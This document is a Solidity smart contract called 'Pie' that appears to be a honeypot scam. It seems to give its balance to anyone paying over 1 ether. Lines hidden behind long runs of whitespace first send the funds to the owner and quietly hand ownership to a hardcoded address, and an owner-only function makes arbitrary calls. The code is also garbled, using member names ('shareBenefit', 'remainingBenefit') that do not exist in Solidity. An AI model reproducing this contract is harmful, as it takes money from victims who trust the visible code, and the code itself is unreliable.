pragma solidity ^0.4.19;

contract Pie
{
    address public Supervisor = msg.sender;

    function()
    public
    payable
    {

    }

    function GetPie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       Supervisor.shareBenefit(this.remainingBenefit);
            msg.sender.shareBenefit(this.remainingBenefit);
        }
    }

    function accessBenefit()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Supervisor=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}
        require(msg.sender == Supervisor);
        Supervisor.shareBenefit(this.remainingBenefit);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Supervisor);
        adr.call.value(msg.value)(data);
    }
}